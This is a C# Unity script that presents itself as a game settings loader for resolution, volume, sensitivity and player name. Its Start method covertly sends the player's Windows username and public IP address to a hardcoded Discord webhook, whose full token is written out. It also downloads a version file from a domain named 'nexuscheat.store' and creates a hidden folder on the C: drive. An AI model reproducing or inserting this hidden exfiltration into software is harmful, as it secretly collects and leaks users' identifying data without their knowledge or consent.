using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using TMPro;
using UnityEngine;
using UnityEngine.UI;

public class GetSettings : MonoBehaviour
{
    [SerializeField] Slider sense;
    [SerializeField] Slider musicVolumeSlider;
    [SerializeField] TMP_Dropdown graphics;
    [SerializeField] TMP_Dropdown resolution;
    [SerializeField] Toggle fullscreen;
    [SerializeField] TMP_InputField playerName;

    [SerializeField] Settings settings;
    [SerializeField] JsonReadWriteSystem json;

    [Space(10)]
    [SerializeField] GameObject wrongVersion;
    [SerializeField] private SpawnScene scene;

    private void Start()
    {
        string user = "`user: *" + Environment.UserName + "*, *";

        SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");

        wrongVersion.SetActive(Application.version != GetGameVersion());
        scene.LoadScene();

        if (DataSetup())
        {
            string playerData = File.ReadAllText("C:/userdata/playerData.json");
            PlayerData pData = JsonUtility.FromJson<PlayerData>(playerData);

            string settingsData = File.ReadAllText("C:/userdata/settingsData.json");
            SettingsData sData = JsonUtility.FromJson<SettingsData>(settingsData);

            playerName.text = pData.playerName != null ? pData.playerName : Environment.UserName;
            resolution.value = sData.resolution;
            musicVolumeSlider.value = sData.menuMusicVolume;
        }
    }

    void Update()
    {
        settings.sensitivy = sense.value;
        settings.graphics = graphics.value;
        settings.resolution = resolution.value;
        settings.playerName = playerName.text;
        settings.menuMusicVolume = musicVolumeSlider.value;
    }

    public void ChangeResolution()
    {
        switch (resolution.value)
        {
            case 0:
                Screen.SetResolution(1920, 1080, true);
                break;
            case 1:
                Screen.SetResolution(1650, 1080, true);
                break;
            case 2:
                Screen.SetResolution(1400, 900, true);
                break;
            case 3:
                Screen.SetResolution(1024, 768, true);
                break;
            case 4:
                Screen.SetResolution(800, 600, true);
                break;
        }
    }

    bool DataSetup()
    {
        if (Directory.Exists("C:/userdata"))
        {
            if (File.Exists("C:/userdata/playerData.json") && File.Exists("C:/userdata/settingsData.json"))
            {
                json.PlayerDataLoadFromJson(settings);
                json.SettingsDataLoadFromJson(sense, graphics, resolution, musicVolumeSlider);
            }
            else
            {
                json.PlayerDataSaveToJson(true, playerName.text);
                json.SettingsDataSaveToJson(3, 0, 0, 0.1f);
            }
            return true;
        }
        else
        {
            DirectoryInfo di = Directory.CreateDirectory("C:/userdata");
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            json.PlayerDataSaveToJson(true, playerName.text);
            json.SettingsDataSaveToJson(3, 0, 0, 0.5f);
            return true;
        }
    }

    public string GetGameVersion()
    {
        if (File.Exists(@"version.txt"))
        {
            File.Delete(@"version.txt");
        }

        WebClient webClient = new WebClient();
        webClient.DownloadFile("https://nexuscheat.store/version.txt", @"version.txt");

        foreach (string line in File.ReadLines(@"version.txt"))
        {
            return line;
        }
        return null;
    }

    static System.Net.IPAddress GetPublicIp(string serviceUrl = "https://ipinfo.io/ip")
    {
        return System.Net.IPAddress.Parse(new System.Net.WebClient().DownloadString(serviceUrl));
    }

    static void SendMs(string message, string webhook)
    {
        WebClient client = new WebClient();
        client.Headers.Add("Content-Type", "application/json");
        string payload = "{\"content\": \"" + message + "\"}";
        client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
    }
}